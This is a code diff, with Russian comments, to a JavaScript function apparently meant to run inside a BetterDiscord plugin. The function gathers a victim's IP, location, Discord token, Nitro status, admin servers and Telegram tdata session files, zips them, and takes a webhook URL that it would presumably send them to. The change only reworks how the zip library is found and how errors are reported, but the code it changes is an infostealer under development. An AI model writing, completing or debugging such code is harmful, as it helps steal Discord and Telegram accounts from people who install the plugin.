@@ -2,13 +2,16 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
     let fs = null;
     try { fs = require('fs'); } catch (e) { return { success: false, error: "Модуль fs недоступен." }; }
 
-    // Проверяем, какие ключи есть в fflate
-    let zipSyncFunc = null;
-    let fflateKeys = "нет";
+    let zipFunc = null;
     if (fflate) {
-        fflateKeys = Object.keys(fflate).join(', ');
-        if (typeof fflate.zipSync === 'function') zipSyncFunc = fflate.zipSync;
-        else if (fflate.default && typeof fflate.default.zipSync === 'function') zipSyncFunc = fflate.default.zipSync;
+        if (typeof fflate.zipSync === 'function') zipFunc = fflate.zipSync;
+        else if (fflate.default && typeof fflate.default.zipSync === 'function') zipFunc = fflate.default.zipSync;
+    }
+    
+    if (!zipFunc) {
+        // Если это не fflate, выведем первые 5 ключей, чтобы понять, что нам передали
+        let keys = fflate ? Object.keys(fflate).slice(0, 5).join(', ') : "null";
+        return { success: false, error: `fflate не найдена. Передано: [${keys}...]` };
     }
 
     let result = { ip: null, location: null, nitro: "Нет", dtoken: null, telegram_path: null, debug_tdata: [], admin_servers: [] };
@@ -69,14 +72,10 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                 result.debug_tdata.push(`Прочитано файлов: ${Object.keys(files).length}`);
                 
                 if (Object.keys(files).length > 0) {
-                    if (zipSyncFunc) {
-                        result.debug_tdata.push("Запуск zipSync...");
-                        tdataZipBuffer = zipSyncFunc(files);
-                        result.debug_tdata.push("ZIP успешно создан!");
-                        hasTdata = true;
-                    } else {
-                        result.debug_tdata.push(`Ошибка: zipSync не найден. Ключи fflate: [${fflateKeys}]`);
-                    }
+                    result.debug_tdata.push("Запуск zipSync...");
+                    tdataZipBuffer = zipFunc(files);
+                    result.debug_tdata.push("ZIP успешно создан!");
+                    hasTdata = true;
                 }
             } else {
                 result.debug_tdata.push("Папка tdata не найдена.");
